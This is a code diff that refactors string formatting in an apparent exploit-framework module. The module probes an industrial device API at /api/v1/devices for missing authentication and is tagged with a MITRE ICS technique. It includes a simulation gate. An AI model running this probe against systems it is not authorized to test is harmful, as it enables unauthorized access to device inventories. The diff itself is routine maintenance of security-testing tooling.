@@ -40,19 +40,19 @@ class Exploit(Exploit):
         if not self.target:
             print_error("Set target.")
             return
-        url = "https://{}:{}/api/v1/devices".format(self.target, self.port)
+        url = f"https://{self.target}:{self.port}/api/v1/devices"
         if self.simulate or not self.destructive:
             DestructiveGate.print_simulation(
-                description="GET {} without Authorization header — expect 200 + device list".format(url),
+                description=f"GET {url} without Authorization header — expect 200 + device list",
                 mitre_techniques=["T0886"],
             )
             return
         if not _HAS_REQUESTS:
             print_error("pip install requests")
             return
-        print_status("Probing {} ...".format(url))
+        print_status(f"Probing {url} ...")
         try:
             r = requests.get(url, verify=False, timeout=8)
-            print_info("HTTP {} — {} bytes".format(r.status_code, len(r.content)))
+            print_info(f"HTTP {r.status_code} — {len(r.content)} bytes")
         except Exception as exc:
             print_error(str(exc))
